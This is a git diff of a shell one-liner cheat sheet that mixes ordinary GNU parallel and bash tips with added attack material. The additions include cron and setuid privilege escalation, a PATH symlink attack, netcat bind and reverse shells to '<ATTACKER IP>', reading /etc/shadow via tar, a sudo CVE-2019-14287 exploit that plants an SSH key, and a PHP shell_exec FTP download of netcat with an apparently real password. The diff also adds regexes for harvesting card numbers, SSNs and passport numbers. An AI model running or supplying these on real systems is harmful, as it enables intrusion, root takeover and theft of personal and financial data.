@@ -58,6 +58,56 @@ time seq 65535 | parallel -k --joblog portscan -j9 --pipe --cat -j200% -n9000 --
 time seq 1000|parallel -a 1 -j1000 wget
 ```
 
+### Exploiting crontab - If a script is running with higher privileges
+```sh
+echo "cat /challenge/app-script/ch4/.passwd >/tmp/cracked" > \
+    cron.d/go && chmod a+x cron.d/go \
+    && sleep 60 && \
+    cat /tmp/cracked
+```
+
+### Get user ID
+
+```sh
+cat /etc/passwd | grep shell4cracked
+```
+
+### C program to get a shell
+
+```sh
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setresuid(1028, 1028, 1028);
+    setresuid(1028, 1028, 1028);  
+    system("/bin/bash");
+    return 0;
+}
+
+#### Compile and prepare
+
+gcc -o /tmp/pwned /tmp/._cron/shell.c
+chmod +s /tmp/pwned   
+chmod a+rwx /tmp/pwned
+```
+
+### If you need to kill a specific process using a given port
+
+```sh
+fuser -k 445/tcp
+```
+
+### Broadcast your shell thru port 5000
+```sh
+bash -i 2>&1 | tee /dev/stderr | nc -l 5000
+```
+
+### You can use the following trick to easy navigate and select paths or others args $_ takes the last argument of the last simplec command executed
+```sh
+mkdir fooPath && cd $_
+```
+
 ###  Fastest segmented parallel sync of a remote directory over ssh
 
 ```sh
@@ -71,6 +121,8 @@ find /glftpd/site/archive -type f|grep '([0-9]\{1,9\})\.[^.]\+$'|parallel -n1 -j
 ```
 
 ###  Create a progress bar over entire window until we count to 1000
+
+![Screenshot](.previews/parallel_print_progress.gif)
 
 ```sh
 seq 1000 |parallel -j30 --bar '(echo {};sleep 0.1)'
@@ -87,6 +139,26 @@ lsof -i -nlP|awk '{print $9, $8, $1}'|sed 's/.*://'|sort -u
 ```sh
 netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u
 ```
+
+### Symbolic link attack 
+```sh
+int main(void)
+{
+        system("ls /path/to/.passwd");
+        return 0;
+}
+```
+
+### Then run: 
+
+```sh
+ln -s /bin/cat /tmp/ls
+ls -l /tmp/ls
+PATH=/tmp
+echo $PATH
+./binary1
+```
+
 ### Print title of website:
 
 ```sh
@@ -304,77 +376,7 @@ done
 done
 ```
 
-# Extract credit card data
 
-### Visa
-
-```sh
-grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
-```
-
-### #MasterCard
-```sh
-grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
-```
-
-### American Express
-```sh
-grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
-```
-
-### Diners Club
-```sh
-grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
-```
-
-### Discover
-```sh
-grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
-```
-
-### JCB
-
-```sh
-grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
-```
-
-### AMEX
-```sh
-grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt
-```
-
-# Extract IDs
-
-
-### Extract Social Security Number (SSN)
-```sh
-grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" 
-```
-
-### Extract Indiana Driver License Number
-```sh
-grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" 
-```
-
-### Extract US Passport Cards
-```sh
-grep -E -o "C0[0-9]{7}" 
-```
-
-### Extract US Passport Number
-```sh
-grep -E -o "[23][0-9]{8}"
-```
-
-### Extract US Phone Numberss
-```sh
-grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' 
-```
-
-### Extract ISBN Numbers
-```sh
-grep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" 
-```
 
 ### Check if a zip or a rar file has password-protection
 
@@ -398,4 +400,219 @@ unrar x -p- -y -o+ "$file" 1&gt; /dev/null 2&gt; /dev/null
 if [ "$?" -eq "3" ] ; then
     unrar x -p$password -y -o+ "$file" 1&gt; /dev/null 2&gt; /dev/null
 fi
+```
+
+### Make changes in .bashrc immediately available
+```sh
+bashrc-reload() { 
+	builtin unalias -a; builtin unset -f $(builtin declare -F | \
+	 sed 's/^.*declare[[:blank:]]\+-f[[:blank:]]\+//'); 
+	source ~/.bashrc; 
+}
+```
+
+
+### Delete static and dynamic arp for /24 subnet
+```sh
+for i in {1..254}; do 
+	arp -d 192.168.0.$i; 
+done
+```
+### Preserve your fingers from cd ..; cd ..; cd..; cd..;
+```sh
+up() { 
+	DEEP=$1; 'for i in $(seq 1 ${DEEP:-"1"}); do cd ../; 
+done
+}
+```
+### Get executed script's current working directory
+```sh
+CWD=$(cd "$(dirname "$0")" && pwd)
+```
+### Scan all open ports without any required program
+```sh
+for i in {1..65535}; do 
+	(echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && \
+	printf "\n[+] Open Port at\n: \t%d\n" "$i" \
+	|| printf "."; 
+done
+```
+
+### Create a txt files with 10000 rows
+```sh
+for FILE in *.full ; do 
+	split -l 100000 $FILE; mv -f xaa `echo "$FILE" \
+	| cut -d'.' -f1`.txt; rm -f x*; 
+done
+```
+### File transfer as a PRO
+
+```sh
+#!/bin/sh
+
+ftp -n IP <<END_SCRIPT
+quote USER acknak
+quote PASS jLQRZy4gyLhmMqz2whTw
+binary
+GET file.py
+quit
+END_SCRIPT
+exit 0
+```
+
+### Can also be done over PHP
+
+```php
+<?php echo shell_exec("echo open 192.168.42.102 21>/usr/local/databases/ftp.txt");?>
+<?php echo shell_exec("echo user acknak jLQRZy4gyLhmMqz2whTw>> /usr/local/databases/ftp.txt");?>
+<?php echo shell_exec("echo binary>> /usr/local/databases/ftp.txt");?>
+<?php echo shell_exec("echo get netcat /usr/local/databases/netcat>>/usr/local/databases/ftp.txt");?>
+<?php echo shell_exec("echo bye>> /usr/local/databases/ftp.txt");?>
+
+<?php echo shell_exec("ftp -n < /usr/local/databases/ftp.txt");?>
+```
+
+### Escaping Shells 
+```sh
+echo FREEDOM! && cd () bash && cd
+```
+
+### TAR can read all files, so you can create a tar with a wanted file and than extract it
+```sh
+tar -cvf shadow.tar "/etc/shadow"
+tar -xvf shadow.tar
+cat etc/shadow
+```
+
+### Netcat without -e
+
+A lot of machines have netcat installed (example macosx) but it's not usable for reverse shells. However, with this it becomes useable.
+
+```sh
+mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc <ATTACKER IP> <PORT> 1>/tmp/backpipe
+```
+
+### Overcome limited shells 
+
+#### Some payloads to overcome limited shells
+
+```sh
+ssh user@$ip nc $localip 4444 -e /bin/sh
+python -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=linux
+```
+
+#### Bash
+```sh
+#### Bash
+echo os.system('/bin/bash')
+/bin/sh -i
+exec "/bin/sh";
+```
+
+#### Perl
+```sh
+perl —e 'exec "/bin/sh";'
+```
+
+## Dash
+
+```sh
+# /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): 
+install -mode 4755 /bin/dash /tmp/sh
+# Then you will have a /tmp/sh that gives any user who calls it root !
+```
+
+### Abusing Sudo Rights (CVE 2019-14287)
+
+https://cheatsheet.haax.fr/linux-systems/privilege-escalation/abusing_sudo_rights/
+
+### Exploitable when a user have the following permissions (sudo -l)
+```sh
+(ALL, !root) ALL
+```
+
+### If you have a full TTY, you can exploit it like this
+```sh
+sudo -u#-1 /bin/bash
+```
+
+### If no TTY, you can restart SSH server and add your key
+```sh
+sudo /etc/init.d/ssh restart
+echo 'ssh-rsa AAAA[...snip...]fd48as= root@kali-jms' > authorized_keys
+sudo -u#-1 bash
+```
+
+
+### Regex
+
+#### Visa
+
+```sh
+grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
+```
+
+#### #MasterCard
+```sh
+grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
+```
+
+#### American Express
+```sh
+grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
+```
+
+#### Diners Club
+```sh
+grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
+```
+
+#### Discover
+```sh
+grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
+```
+
+#### JCB
+
+```sh
+grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
+```
+
+### AMEX
+```sh
+grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt
+```
+
+### Extract IDs
+
+
+#### Extract Social Security Number (SSN)
+```sh
+grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" 
+```
+
+#### Extract Indiana Driver License Number
+```sh
+grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" 
+```
+
+#### Extract US Passport Cards
+```sh
+grep -E -o "C0[0-9]{7}" 
+```
+
+#### Extract US Passport Number
+```sh
+grep -E -o "[23][0-9]{8}"
+```
+
+#### Extract US Phone Numberss
+```sh
+grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' 
+```
+
+#### Extract ISBN Numbers
+```sh
+grep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" 
 ```
